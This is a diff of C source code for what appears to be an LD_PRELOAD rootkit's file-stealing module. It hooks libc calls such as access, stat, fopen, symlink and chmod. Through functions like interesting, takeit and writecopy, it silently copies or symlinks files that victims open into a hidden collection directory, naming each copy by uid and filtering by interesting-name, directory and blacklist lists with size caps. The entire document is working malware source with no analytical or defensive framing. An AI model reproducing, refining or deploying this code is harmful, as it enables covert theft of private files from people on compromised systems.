@@ -1,3 +1,85 @@
+#ifdef BLACKLIST_TOO
+int uninteresting(char *path){
+    for(int i = 0; i < NAMESBLACKLIST_SIZE; i++){
+        if(!strncmp(namesblacklist[i], path, strlen(namesblacklist[i])))
+            return 1;
+
+        if(!fnmatch(namesblacklist[i], path, FNM_PATHNAME))
+            return 1;
+    }
+    return 0;
+}
+#endif
+
+#if defined SYMLINK_FALLBACK || defined SYMLINK_ONLY
+int linkfile(const char *oldpath, char *newpath){
+    hook(CSYMLINK);
+    char newnewpath[strlen(newpath)+6];
+    snprintf(newnewpath, sizeof(newnewpath), "%s-link", newpath);
+
+    if(oldpath[0] == '/')
+        return (long)call(CSYMLINK, oldpath, newnewpath);
+    
+    // if oldpath is not a full pathname we must get it now
+    char *cwd, *oldoldpath;
+
+    cwd = getcwd(NULL, 0);
+    if(cwd == NULL) return 1;
+    oldoldpath = fullpath(cwd, oldpath);
+    free(cwd);
+
+    int ret = (long)call(CSYMLINK, oldoldpath, newnewpath);
+    free(oldoldpath);
+    return ret;
+}
+#endif
+
+char *fullpath(char *cwd, const char *file){
+    size_t pathlen = strlen(cwd)+strlen(file)+2;
+    char *ret = malloc(pathlen);
+    memset(ret, 0, pathlen);
+    snprintf(ret, pathlen, "%s/%s", cwd, file);
+    return ret;
+}
+
+int fileincwd(char *cwd, const char *file){
+    int incwd=0;
+    char *curpath = fullpath(cwd, file);
+
+    hook(CACCESS);
+    if((long)call(CACCESS, curpath, F_OK) == 0)
+        incwd=1;
+
+    free(curpath);
+    return incwd;
+}
+
+#ifdef DIRECTORIES_TOO
+int interestingdir(const char *path){
+    int interest=0;
+    char *cwd = getcwd(NULL, 0), *intdir;
+    if(cwd != NULL){
+        for(int i = 0; i != INTERESTING_DIRECTORIES_SIZE; i++){
+            intdir = interesting_directories[i];
+
+            if(!strncmp(intdir, cwd, strlen(intdir)) && fileincwd(cwd, path)){
+                interest = 1;
+                break;
+            }
+
+            if(!strncmp(intdir, path, strlen(intdir))){
+                interest = 1;
+                break;
+            }
+        }
+
+        free(cwd);
+    }
+
+    return interest;
+}
+#endif
+
 int interesting(const char *path){
     char *interesting_file;
     int interest = 0;
@@ -16,61 +98,59 @@ int interesting(const char *path){
     }
 
 #ifdef DIRECTORIES_TOO
-    char *cwd;
-    if(interest != 1 && ((cwd = getcwd(NULL, 0)) != NULL)){
-        char *interesting_dir,
-             *pathdup,
-             *bname;
-        
-        for(int i = 0; i < INTERESTING_DIRECTORIES_SIZE; i++){
-            interesting_dir = interesting_directories[i];
-
-            if(!strncmp(interesting_dir, cwd, strlen(interesting_dir))){
-                pathdup = strdup(path);
-                bname = basename(pathdup);
-
-                char curpath[strlen(cwd)+strlen(bname)+2];
-                memset(curpath, 0, sizeof(curpath));
-                snprintf(curpath, sizeof(curpath), "%s/%s", cwd, bname);
-                free(pathdup);
-
-                hook(CACCESS);
-                if((long)call(CACCESS, curpath, F_OK) == 0){
-                    interest = 1;
-                    break;
-                }
-            }
-
-            if(!strncmp(interesting_dir, path, strlen(interesting_dir))){
-                interest = 1;
-                break;
-            }
-        }
-        free(cwd);
-    }
+    if(interest != 1 && interestingdir(path))
+        interest = 1;
 #endif
 
     return interest;
 }
 
-int writecopy(const char *oldpath, char *newpath, off_t filesize){
+int writecopy(const char *oldpath, char *newpath){
+    struct stat nstat; // for newpath, should it exist, to check if there's a change in size.
+    int statr;
     unsigned char *buf;
     FILE *ofp, *nfp;
     size_t n, m;
-    off_t blksize;
+    off_t blksize, fsize;
+    mode_t mode;
 
-    hook(CFOPEN, CFWRITE);
+    hook(CFWRITE, C__XSTAT);
 
-    ofp = call(CFOPEN, oldpath, "rb");
-    if(ofp == NULL) return -1;
+    ofp = bindup(oldpath, newpath, &nfp, &fsize, &mode);
+    if(ofp == NULL && errno == ENOENT) return 1;
+    else if(ofp == NULL) return -1;
 
-    nfp = call(CFOPEN, newpath, "wb");
-    if(nfp == NULL){
+    memset(&nstat, 0, sizeof(struct stat));
+    statr = (long)call(C__XSTAT, _STAT_VER, newpath, &nstat);
+
+    if(!S_ISREG(mode) || (statr && nstat.st_size == fsize)){
         fclose(ofp);
-        return -1;
+        fclose(nfp);
+        return 1;
     }
 
-    blksize = getablocksize(filesize);
+    if(statr < 0 && errno != ENOENT){
+        fclose(ofp);
+        fclose(nfp);
+        return 1;
+    }
+
+#ifdef MAX_FILE_SIZE
+    if(fsize > MAX_FILE_SIZE){
+        fclose(ofp);
+        fclose(nfp);
+        return -1;
+    }
+#endif
+#ifdef MAX_STEAL_SIZE
+    if(getnewsize(fsize) > MAX_STEAL_SIZE){
+        fclose(ofp);
+        fclose(nfp);
+        return -1;
+    }
+#endif
+
+    blksize = getablocksize(fsize);
     do{
         buf = malloc(blksize+1);
         memset(buf, 0, blksize+1);
@@ -85,21 +165,19 @@ int writecopy(const char *oldpath, char *newpath, off_t filesize){
 
     fclose(ofp);
     fclose(nfp);
+
+#ifdef KEEP_FILE_MODE
+    hook(CCHMOD);
+    if(copystat)
+        call(CCHMOD, newpath, mode);
+#endif
+
     return 1;
 }
 
-#ifdef SYMLINK_FALLBACK
-int linkfile(const char *oldpath, char *newpath){
-    hook(CSYMLINK);
-    char newnewpath[strlen(newpath)+6];
-    snprintf(newnewpath, sizeof(newnewpath), "%s-link", newpath);
-    return (long)call(CSYMLINK, oldpath, newpath);
-}
-#endif
-
 char *getnewpath(char *filename){
     int path_maxlen = strlen(INTEREST_DIR) +
-                      strlen(filename) + 16;
+                      strlen(filename) + 32;
     char *ret, *filenamedup = strdup(filename);
 
     if(filenamedup[0] == '.') // remove prefixed '.' if there is one.
@@ -107,63 +185,43 @@ char *getnewpath(char *filename){
 
     ret = malloc(path_maxlen);
     memset(ret, 0, path_maxlen);
-    snprintf(ret, path_maxlen, "%s/%s-%d",
+    snprintf(ret, path_maxlen, "%s/%d-%s",
                                 INTEREST_DIR,
-                                filenamedup,
-                                getuid());
+                                getuid(),
+                                filenamedup);
 
     free(filenamedup);
     return ret;
 }
 
-int stealfile(const char *oldpath, char *filename, char *newpath){
-    struct stat astat, // for oldpath.
-                pstat; // for newpath, should it exist, to check if there's a change in size.
-
-    hook(C__XSTAT);
-
-    memset(&astat, 0, sizeof(struct stat));
-
-    if((long)call(C__XSTAT, _STAT_VER, oldpath, &astat) < 0) return -1;
-    if(!S_ISREG(astat.st_mode)) return 1;   /* we only want to look at regular files. */
-#ifdef MAX_FILE_SIZE
-#ifdef SYMLINK_FALLBACK
-    if(astat.st_size > MAX_FILE_SIZE)
-        return linkfile(oldpath, newpath);
+int takeit(const char *oldpath, char *newpath){
+#ifdef SYMLINK_ONLY
+    return linkfile(oldpath, newpath);
 #else
-    if(astat.st_size > MAX_FILE_SIZE)
-        return 1;
-#endif
-#endif
-
-    memset(&pstat, 0, sizeof(struct stat));
-    int statstat = (long)call(C__XSTAT, _STAT_VER, newpath, &pstat);
-    if(statstat && pstat.st_size != astat.st_size){
-        int copystat = writecopy(oldpath, newpath, astat.st_size);
+    int copystat = writecopy(oldpath, newpath);
 #ifdef SYMLINK_FALLBACK
-        if(copystat < 0)
-            return linkfile(oldpath, newpath);
+    if(copystat < 0)
+        return linkfile(oldpath, newpath);
 #endif
-        return copystat;
-    }else if(statstat < 0 && errno == ENOENT){
-        int copystat = writecopy(oldpath, newpath, astat.st_size);
-#ifdef SYMLINK_FALLBACK
-        if(copystat < 0)
-            return linkfile(oldpath, newpath);
+    return copystat;
 #endif
-        return copystat;
-    }
-    return -1;
 }
 
-void inspect_file(const char *pathname){
+
+void inspectfile(const char *pathname){
     char *dupdup   = strdup(pathname),
          *filename = basename(dupdup),
          *newpath;
 
     if(interesting(pathname) || interesting(filename)){
         newpath = getnewpath(filename);
-        stealfile(pathname, filename, newpath);
+
+#ifdef BLACKLIST_TOO
+        if(!uninteresting(filename))
+            takeit(pathname, newpath);
+#else
+        takeit(pathname, newpath);
+#endif
         free(newpath);
     }
 
